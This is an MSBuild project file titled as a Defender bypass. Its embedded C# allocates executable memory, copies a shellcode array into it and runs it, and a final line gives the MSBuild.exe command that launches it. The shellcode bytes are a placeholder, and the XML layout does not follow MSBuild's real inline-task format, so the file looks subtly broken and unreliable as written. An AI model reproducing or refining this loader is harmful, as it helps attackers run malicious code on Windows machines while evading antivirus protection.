<!-- msbuild_bypass.xml -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="DefenderBypass">
    <ClassExample>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Runtime.InteropServices;
          public class Bypass {
            [DllImport("kernel32.dll")]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
                uint flAllocationType, uint flProtect);
            
            public static void Main() {
              byte[] shellcode = new byte[] { /* shellcode */ };
              IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                  0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
              Marshal.Copy(shellcode, 0, addr, shellcode.Length);
              Marshal.GetDelegateForFunctionPointer<Action>(addr)();
            }
          }
        ]]>
      </Code>
    </ClassExample>
  </Target>
</Project>


//Start:  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_bypass.xml
